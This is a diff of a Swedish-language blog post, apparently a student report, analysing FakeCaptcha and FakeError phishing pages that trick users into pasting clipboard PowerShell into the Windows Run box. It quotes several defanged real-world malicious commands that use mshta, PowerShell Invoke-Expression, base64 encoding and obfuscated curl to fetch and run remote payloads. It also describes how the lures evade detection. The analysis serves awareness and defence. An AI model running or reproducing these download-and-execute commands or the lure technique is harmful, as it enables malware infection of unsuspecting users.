@@ -1,46 +1,84 @@
-# Fakecaptcha / FakeError Phishing Analys
-Detta kommer vara en sammanfattning av alla rapporter och information om ett slags phishing metod som används av hackarna. 
+# FakeCaptcha Phishing Analys
+Denna bloggen kommer innehålla kortfattad information som jag har hittat när det gäller FakeCaptcha Phishing och Labb.
 
-
-
-# FakeError
-Detta är ett virus phishing metod som grundar på att lura användaren att är nåt fel på en hemsida som liknar en riktig hemsida, som sen visar hur man kan "fixa" problemet genom att trycka WIN + R och sen CTRL + V. Detta klistrar in en skadlig powershell kod i windows run.
-
-FakeError bild exempel
-
-![FakeErrorBild](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg)
 
 # Fakecaptcha 
 
-Funkar exakt samma some FakeError de enda skillnaden är att de står "för att lösa captchan behöver du win + r  ctrl + v"
+FakeCaptcha är en phishing metod som använder captcha på för att lura användarna att själv skriva in illvillig powershell kod i sin dator.
+Hemsidan kommer visa en fake captcha och för att komma vidare till den "riktiga hemsidan" måste man bevisa att man är inte en robot genom att följa instruktionerna.
 
-![FakeCaptcha](https://raw.githubusercontent.com/redsnw/redsnw.github.io/refs/heads/main/Fakecaptcha.jpeg)
+Instruktionerna
+1. WIN + R            -- Öppnar Run boxen i Windows
+2. CTRL + V           -- Klistrar in en illvillig powershell kod i run boxen
+3. Enter              -- För att köra koden i run
 
-Bild referens https://any.run/cybersecurity-blog/cyber-attacks-october-2024/
 
+Om du undrar hur koden blev kopierad i första hand är de för att användaren tryckte "Im not a robot" eller "Verify" först, innan instruktionerna dök upp.
+Den Kopieras i smyg utan användarens kunskap.
+
+Som bilden visar nedanför försöker hackarna ge användarna en falsk trygghet genom att visa bara en del av powershell koden som ser ut och vara äkta.
+
+![Fakecaptchaps1](https://www.malwarebytes.com/wp-content/uploads/sites/2/2025/03/run_command.jpg)
+
+Nedanför finns det exempel på hur powershell koden kan se ut.
+
+```
+mshta.exe hxxps://ernier[.]shop/lyricalsync[.]mp3 # ''Ι am nοt a rοbοt: САРТСНА Verification UID: 885203
+
+mshta.exe hxxps://zb-files[.]oss-ap-southeast-1[.]aliyuncs[.]com/DPST_doc.mp3 #  ''Ι am nοt a rοbοt: САРТСНА Verification UID: 815403
+
+mshta.exe hxxp://ok[.]fish-cloud-jar[.]us/ # "Authentication needed: Secure Code 3V8MUR-9PW4S"
+
+mshta.exe hxxps://yedik[.]shop/Tech_House_Future[.]mp3 #  ''Ι am nοt a rοbοt: САРТСНА Verification UID: 885203
+
+mshta.exe hxxps://x63-hello[.]live/nF3mXcQ9FVjs1sMt[.]html #'' I'm human ID241619''
+
+mshta.exe hxxps://welcome12-world[.]com/wpDoQRpZt2PIffud[.]html #'' I'm human ID233560''
+
+mshta.exe hxxps://w19-seasalt[.]com/mbDjBsRmxM1LreEp[.]html #'' I'm human ID984662''
+
+PowerShell.exe -W Hidden -command $uri = 'hxxps[://]fessoclick[.]com/clck/dub.txt'; $content = (Invoke-WebRequest -Uri $uri).Content; Invoke-Expression $content”
+
+cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwB2AGkAZQB3AGUAcgAtAHYAYwBjAHAAYQBzAHMALgBjAG8AbQAvAGkAbgAuAHAAaABwAD8AYQBjAHQAaQBvAG4APQAxACcAKQA=" && ✅ I am not a robot - reCAPTCHA ID: 7845
+
+mshta hxxps://check[.]nejyd[.]icu/gkcxv[.]google?i=db47f2d4-a1c2-405f-ba9f-8188d2da9156 REM ✅ Human, not a robot: Verification САРTCHA ID:658630
+
+PoWeRsHeLl -w h -c cUr"L.E"x"E" -k -L
+hxxp"s://ka"j"e"c.icu"/f"04b18c2f7ff"48bdbf06"701"38"f9eb2"4f.txt | pow"e"rs"h"el"l" -
+
+```
+
+
+Ett av hackarnas mål är att försöka få användarna tro att hemsidan och att instruktionerna är äkta och det gör dom genom att ändra domän namnet till nåt som ser äkta ut oftast använder dom populära hemsidor som facebook eller microsoft. 
+
+Så som bilden visar gör dom backgrunden till den riktiga hemsidan fast suddig.
+
+![FakeCaptcha](https://www.york.ac.uk/media/it-services/images/about/news/2025/Fake%20captcha,%20full%20browser.png)
+
+# FakeError
+
+Fake error är princip samma sak som FakeCaptcha en skillnaden är att den spelar på användarens rädsla att nånting har gått fel.
+För att övertyga användaren mer så låser hemsidan sig själv i fullskärm.
+Exempel på FakeError nedanför.
+
+![FakeErrorBild](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlFgZ371OJLB7x0fK_3a34h710DpAHQLeyLQyaBpp1jhfsFyRD0-tmkLhXAvv0VD1XnU_WK8g5O16VUob1aHIyQf2smhkn6llIaC_H5_6MwogFRD11Hfp-w2kPc9vgiBUTlnftXM7VuCMsFmBPwxtyvAokqOJbgSAndESDU3qZV6-R9SH6meqbyuyoFk8n/s1600-e365/windows.jpg)
+
+# Initial Access
+En Lista för hackarnas olika sätt att sprida FakeCaptcha / FakeError hemsidorna
+- Äkta sidor som ersätts av FakeCaptcha / FakeError
+- Malvertising / SEO-poisoning
+- Redirictions
+- Fake tech support / tutorials
+- E-mail
 
 # Tricks hackarna har använt sig av
-Hackarna använder domän namn som liknar riktiga hemsidor för att lura användare att sidan är äkta.
-Dom använder även andra metoder för att förhindra att bli påkommna av säkerhets företagen gemom att använda Cloudflare captcha på deras egna illvilliga hemsida, för att sen förhindra web crawlers av säkerhets företagen att hitta deras skadlig kod som är i javascript på sidan.
-
-De har upptäcks även att hackarna har använts sig av GET request när du 
+Dom använder även andra metoder för att förhindra att bli påkommna av säkerhets företagen gemom att använda Cloudflare captcha på deras egna illvilliga hemsida, för att sen förhindra web crawlers av säkerhets företagen att hitta deras skadlig kod.
 
 
-Hur funkar det i bakgrunden?
+# Referenser
 
+# Konsekvenserna
 
-Konsekvenserna
+# Labb
 
-
-
-Egna ideer (redovisa handledaren)
-
-Attack metoder
-
-
-
-Referenser
-
-
-
-Labb
+# Referenser
